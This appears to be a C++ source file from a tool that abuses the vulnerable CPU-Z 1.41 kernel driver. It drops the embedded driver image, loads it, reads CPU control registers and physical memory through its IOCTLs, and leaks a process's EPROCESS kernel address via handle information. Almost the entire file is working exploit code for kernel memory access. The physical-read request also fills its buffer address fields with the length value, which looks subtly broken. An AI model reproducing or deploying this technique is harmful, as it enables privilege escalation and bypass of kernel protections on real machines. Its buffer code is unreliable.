#include "cpuzdrvr.h"

#include "cpuz141_shellcode.h"


CpuzDrvr::CpuzDrvr()
	: Driver(CPZ_FILE_NAME, CPZ_SERVICE_NAME, CPZ_DEVICE_NAME)
{
	driverImagePresent =
		util::DumpBinaryImage(util::ToA(CPZ_FILE_NAME), cpuz141ShellCode, sizeof(cpuz141ShellCode));
}



bool CpuzDrvr::InitDriver()
{
	if (!LoadDriver()) return false;
	return true;
}




bool CpuzDrvr::ReadControlRegister(CR_REGISTER crRegister, PULONG64 regValue)
{
	IO_STATUS_BLOCK isb;

	struct
	{
		ULONG CR_Register;
	} inputCRReg = { crRegister };

	if (
		NT_SUCCESS(NtDeviceIoControlFile(GetHandle(), nullptr, nullptr, nullptr,
			&isb, IOCTL_READ_CR, &inputCRReg, sizeof(inputCRReg), regValue, sizeof(*regValue))
		))
		return true;

	return false;
}


/// <summary>Gets the virtual address of the eprocess structure of the given process</summary>
/// <param name="processPid">Pid of process </param>
/// <returns>virtual address of eprocess structure</returns>
void* CpuzDrvr::ProcessEprocessVirtualAddress(uint32_t processPid)
{
	//Get handle to process
	//---------------------
	HANDLE	hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, processPid);
	void*	eProcessVAddr = nullptr;

	if (hProcess > 0)
	{
		// Query handle information since it leaks eprocess address
		//-----------------------------------------------------------
		nt::SYSTEM_HANDLE_INFORMATION handleInfor;
		if (util::GetHandleInfor(hProcess, GetCurrentProcessId(), &handleInfor))
			eProcessVAddr = handleInfor.Object;

		// Close Process handle
		//----------------------
		CloseHandle(hProcess);
	}

	return eProcessVAddr;
}






bool CpuzDrvr::ReadPhysicalAddr(void* physicalAddress, void* outBuffer, size_t bufferLength)
{
	if (physicalAddress == nullptr || outBuffer == nullptr)
		return false;

	IO_STATUS_BLOCK isb;

#pragma pack(push)
#pragma pack(1)
	struct
	{
		uint32_t address_high;
		uint32_t address_low;
		uint32_t length;
		uint32_t buffer_high;
		uint32_t buffer_low;
	} inputReadMem = {	HIDWORD((uint64_t)physicalAddress), LODWORD((uint64_t)physicalAddress), 
						bufferLength, HIDWORD((uint64_t)bufferLength), LODWORD((uint64_t)bufferLength) };

	struct 
	{
		std::uint32_t operation;
		std::uint32_t buffer_low;
	} outputReadMem;

#pragma pack(pop)

	NTSTATUS status = NtDeviceIoControlFile(GetHandle(), nullptr, nullptr, nullptr,
		&isb, IOCTL_READ_MEM, &inputReadMem, sizeof(inputReadMem), &outputReadMem, sizeof(outputReadMem));
	if (
		NT_SUCCESS(status
		))
		return true;

	return false;
}


CpuzDrvr::~CpuzDrvr()
{
	this->UnLoadDriver();
}
